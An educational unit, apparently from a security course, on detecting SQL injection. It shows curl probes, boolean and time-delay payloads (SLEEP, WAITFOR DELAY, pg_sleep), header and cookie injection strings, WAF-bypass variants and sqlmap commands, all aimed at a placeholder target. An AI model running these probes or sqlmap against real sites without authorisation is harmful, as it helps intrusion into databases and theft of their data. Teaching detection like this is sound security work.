# Detection Techniques

## Unit 5: SQL Injection — Topic 2

## 🎯 Overview

Detecting SQL injection vulnerabilities requires systematic testing of all input points with carefully crafted payloads. This topic covers manual and automated detection methods, from simple single-character tests to advanced techniques for identifying blind SQLi. Effective detection is the foundation for successful exploitation.

---

## 1. Basic Detection Methodology

```
┌──────────────────────────────────────────────────────────────┐
│              SQLi DETECTION WORKFLOW                          │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  1. Identify input points (params, headers, cookies)         │
│  2. Submit special characters and observe responses          │
│  3. Test for error-based indicators                          │
│  4. Test for boolean-based indicators                        │
│  5. Test for time-based indicators                           │
│  6. Confirm with controlled payloads                         │
│  7. Identify database type                                   │
└──────────────────────────────────────────────────────────────┘
```

---

## 2. Single Character Tests

```bash
# Submit these characters and observe the response:
'        # Single quote — most common SQLi trigger
"        # Double quote
\        # Backslash (escape character)
;        # Statement terminator
)        # Close parenthesis
--       # SQL comment
#        # MySQL comment
/**/     # Block comment

# Test with cURL
curl "https://target.com/page?id=1'"
# Compare response to:
curl "https://target.com/page?id=1"

# Look for:
# • Database error messages
# • Different page content
# • HTTP 500 error
# • Missing content
# • Changed page layout
```

---

## 3. Error-Based Detection

```bash
# Submit and check for database errors in response

# MySQL errors to look for:
# "You have an error in your SQL syntax"
# "Warning: mysql_fetch"
# "MySQLSyntaxErrorException"

# MSSQL errors:
# "Unclosed quotation mark"
# "Incorrect syntax near"
# "Microsoft OLE DB Provider"

# PostgreSQL errors:
# "ERROR: syntax error at or near"
# "PSQLException"

# Oracle errors:
# "ORA-01756: quoted string not properly terminated"
# "ORA-00933: SQL command not properly ended"

# Automated error detection
curl -s "https://target.com/page?id=1'" | \
  grep -iE "(sql|mysql|syntax|ora-|error|warning|unclosed|postgresql)"
```

---

## 4. Boolean-Based Detection

```bash
# Inject true and false conditions, compare responses

# Numeric parameter
curl "https://target.com/page?id=1 AND 1=1"   # True → normal page
curl "https://target.com/page?id=1 AND 1=2"   # False → different page

# String parameter
curl "https://target.com/page?name=admin' AND '1'='1"  # True
curl "https://target.com/page?name=admin' AND '1'='2"  # False

# Compare response sizes
SIZE_TRUE=$(curl -s "https://target.com/page?id=1 AND 1=1" | wc -c)
SIZE_FALSE=$(curl -s "https://target.com/page?id=1 AND 1=2" | wc -c)
echo "True: $SIZE_TRUE bytes, False: $SIZE_FALSE bytes"
# Significant difference → boolean-based SQLi likely
```

---

## 5. Time-Based Detection

```bash
# Inject time delays and measure response time

# MySQL
time curl -s "https://target.com/page?id=1' AND SLEEP(5)--" > /dev/null
# If response takes ~5 seconds → time-based SQLi!

# Universal time test
time curl -s "https://target.com/page?id=1' AND (SELECT 1 FROM \
  (SELECT SLEEP(5))a)--" > /dev/null

# MSSQL
time curl -s "https://target.com/page?id=1'; WAITFOR DELAY '0:0:5'--" \
  > /dev/null

# PostgreSQL
time curl -s "https://target.com/page?id=1'; SELECT pg_sleep(5)--" \
  > /dev/null

# Compare with baseline
time curl -s "https://target.com/page?id=1" > /dev/null
# Normal: 0.2 seconds
# Injected: 5.2 seconds → confirmed!
```

---

## 6. Input Point Testing Matrix

| Input Point | Test Method | Payload Example |
|------------|-------------|-----------------|
| URL parameters | Modify in browser/cURL | `?id=1'` |
| POST body | Intercept in Burp | `username=admin'` |
| Cookie values | Modify cookie header | `Cookie: id=1'` |
| HTTP headers | Add/modify headers | `User-Agent: ' OR 1=1--` |
| JSON body | Modify JSON values | `{"id": "1' OR 1=1--"}` |
| XML body | Modify XML values | `<id>1' OR 1=1--</id>` |
| Path parameters | Modify URL path | `/users/1'/profile` |
| Search fields | Input in search box | `test' OR '1'='1` |

```bash
# Test common injection points
# User-Agent header
curl https://target.com/ -H "User-Agent: ' OR 1=1--"

# Referer header
curl https://target.com/ -H "Referer: ' OR 1=1--"

# Cookie
curl https://target.com/ -H "Cookie: session=1' OR 1=1--"

# X-Forwarded-For
curl https://target.com/ -H "X-Forwarded-For: 1' OR 1=1--"
```

---

## 7. Advanced Detection Techniques

```bash
# Arithmetic test (no special characters needed)
curl "https://target.com/page?id=2-1"    # Should show id=1 page
curl "https://target.com/page?id=1+1"    # Should show id=2 page

# String concatenation test
# MySQL
curl "https://target.com/page?name=adm'+'in"    # 'admin'
# MSSQL
curl "https://target.com/page?name=adm'||'in"   # 'admin'

# NULL test
curl "https://target.com/page?id=1 AND 1=1"
curl "https://target.com/page?id=1 AND NULL=NULL"

# Conditional response (database-agnostic)
curl "https://target.com/page?id=1 AND 'a'='a'"   # True
curl "https://target.com/page?id=1 AND 'a'='b'"   # False

# WAF bypass detection payloads
curl "https://target.com/page?id=1'/**/AND/**/1=1--"
curl "https://target.com/page?id=1'%20AND%201=1--"
```

---

## 8. Automated Detection

```bash
# sqlmap — automated SQL injection detection
sqlmap -u "https://target.com/page?id=1" --batch

# Test POST parameter
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" \
  -p "user" --batch

# Test with cookies
sqlmap -u "https://target.com/dashboard" \
  --cookie="session=abc123; id=1" -p "id" --batch

# Test all parameters
sqlmap -u "https://target.com/page?id=1&name=test&cat=3" \
  --batch --level 3 --risk 2

# Test specific techniques
sqlmap -u "https://target.com/page?id=1" \
  --technique=BEUST --batch
# B=Boolean, E=Error, U=Union, S=Stacked, T=Time
```

---

## 📊 Summary Table

| Detection Method | Speed | Reliability | Stealth |
|-----------------|-------|------------|---------|
| Single character | Fast | Low | High |
| Error-based | Fast | High | Low |
| Boolean-based | Medium | High | Medium |
| Time-based | Slow | High | High |
| Arithmetic | Fast | Medium | High |
| Automated (sqlmap) | Medium | Very High | Low |

---

## ❓ Revision Questions

1. What is the simplest test to detect SQL injection?
2. How do you distinguish between boolean-based and time-based blind SQLi?
3. What database error messages indicate SQL injection vulnerability?
4. Why should headers like User-Agent and Referer be tested for SQLi?
5. How does arithmetic testing detect SQLi without special characters?
6. What sqlmap flags increase detection sensitivity?

---

*Previous: [01-sql-injection-types.md](01-sql-injection-types.md) | Next: [03-exploitation-methodology.md](03-exploitation-methodology.md)*

---

*[Back to README](../README.md)*
